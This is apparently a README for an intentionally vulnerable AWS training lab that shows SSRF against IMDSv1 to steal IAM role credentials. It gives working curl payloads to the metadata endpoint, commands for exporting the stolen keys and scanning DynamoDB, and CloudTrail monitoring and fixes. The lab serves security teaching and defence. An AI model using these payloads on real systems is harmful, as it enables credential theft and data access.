# IMDSv1 Security Lab - Branch: vulnerable

## 💰 AWS Cost Estimate (us-east-1)

**Monthly Cost: $49.63**

| Resource | Monthly Cost | Notes |
|----------|-------------|-------|
| EC2 Instances (2x t3.micro) | $15.18 | Bastion + Web Server |
| NAT Gateway | $32.85 | High cost - removed in later branches |
| EBS Storage (16 GB) | $1.60 | Root volumes |
| CloudTrail, CloudWatch, DynamoDB | Variable | Usage-based pricing |

*Generated with Infracost on $(date '+%Y-%m-%d')*

---

## Overview
This branch demonstrates a **VULNERABLE** configuration where EC2 Instance Metadata Service v1 (IMDSv1) can be exploited via Server-Side Request Forgery (SSRF) to steal IAM role credentials.

⚠️ **WARNING**: This configuration is intentionally vulnerable for educational purposes. DO NOT use in production!

## Current Security Posture (VULNERABLE)
- ✗ IMDSv1 enabled (allows unauthenticated metadata access)
- ✗ No SSRF protection in web application
- ✗ IAM role has broad DynamoDB permissions
- ✗ No network restrictions on IAM role usage
- ✗ DynamoDB accessible from anywhere

## Lab Architecture
```
Internet 
    |
    ├── Bastion Host (Public Subnet)
    │   └── Attack Tools Pre-installed
    |
    └── Web Server (Public Subnet)
        ├── Vulnerable Go Application (Port 8080)
        ├── SSRF Vulnerable Endpoint: /fetch?url=
        └── IAM Role with DynamoDB Access
```

## Attack Scenario

### Prerequisites
1. Create an EC2 key pair:
   ```bash
   aws ec2 create-key-pair --key-name imdsv1-lab --query 'KeyMaterial' --output text > imdsv1-lab.pem
   chmod 400 imdsv1-lab.pem
   ```

2. Deploy the infrastructure:
   ```bash
   cd terraform
   cp terraform.tfvars.example terraform.tfvars
   # Edit terraform.tfvars with your IP and key name
   terraform init
   terraform apply
   ```

### Attack Steps

#### Step 1: Connect to Bastion Host
```bash
ssh -i imdsv1-lab.pem ec2-user@<BASTION_PUBLIC_IP>
```

#### Step 2: Exploit SSRF to Access IMDS
The web server has a vulnerable `/fetch` endpoint that doesn't validate URLs:

```bash
# From bastion, discover the IAM role name
curl "http://<WEB_SERVER_PRIVATE_IP>:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Response: imdsv1-lab-web-server-role
```

#### Step 3: Steal IAM Credentials
```bash
# Get the full credentials
curl "http://<WEB_SERVER_PRIVATE_IP>:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/imdsv1-lab-web-server-role"

# Response includes:
# - AccessKeyId
# - SecretAccessKey  
# - Token (Session Token)
```

#### Step 4: Use Stolen Credentials
```bash
# Use the pre-installed attack script
./steal-creds.sh http://<WEB_SERVER_PRIVATE_IP>:8080

# Or manually export credentials
export AWS_ACCESS_KEY_ID=<stolen_access_key>
export AWS_SECRET_ACCESS_KEY=<stolen_secret_key>
export AWS_SESSION_TOKEN=<stolen_token>

# Access DynamoDB with stolen credentials
aws dynamodb scan --table-name Products --region us-east-1
```

## Why This Attack Works
1. **IMDSv1 Vulnerability**: No authentication required to access metadata
2. **SSRF in Application**: The `/fetch` endpoint doesn't validate or restrict URLs
3. **No Network Boundaries**: IAM credentials can be used from any location
4. **Overly Permissive IAM**: Role has broad DynamoDB permissions

## Legitimate API Usage
The web server also exposes legitimate product APIs:
```bash
# Get all products
curl http://<WEB_SERVER_PUBLIC_IP>:8080/api/products

# Get specific product
curl http://<WEB_SERVER_PUBLIC_IP>:8080/api/products/1
```

## Next Steps
Check out the other branches to see progressive security improvements:
- `branch-2-vpc-conditional`: Adds VPC endpoint conditions to IAM policies
- `branch-3-vpc-endpoint`: Implements VPC endpoints with restricted access

## Security Monitoring

### CloudWatch Logs
Monitor real-time attack attempts:
```bash
# View SSRF attempts
aws logs tail /aws/ec2/imdsv1-lab/web-server --follow --filter-pattern "CRITICAL"

# View access logs
aws logs tail /aws/ec2/imdsv1-lab/web-server --follow --stream-name-prefix access
```

### CloudTrail Audit
Complete audit trail of all API calls:
```bash
# View IAM role assumptions (credential theft)
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --region us-east-1

# View DynamoDB access with stolen credentials
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=ResourceName,AttributeValue=Products \
  --region us-east-1

# Export all CloudTrail logs for analysis
aws s3 sync s3://imdsv1-lab-cloudtrail-<ACCOUNT_ID> ./cloudtrail-logs/
```

### What Gets Logged
- **CloudWatch**: Application logs, access logs, SSRF attempts
- **CloudTrail**: All AWS API calls including:
  - IAM role assumptions (shows credential usage)
  - DynamoDB operations (shows data access)
  - STS token operations (shows credential theft)

## Cleanup
```bash
terraform destroy
```

## Security Notes
This lab demonstrates real vulnerabilities that exist in many cloud deployments:
- Always use IMDSv2 (require tokens)
- Implement SSRF protections (block metadata IPs)
- Use least-privilege IAM policies
- Implement network boundaries for sensitive resources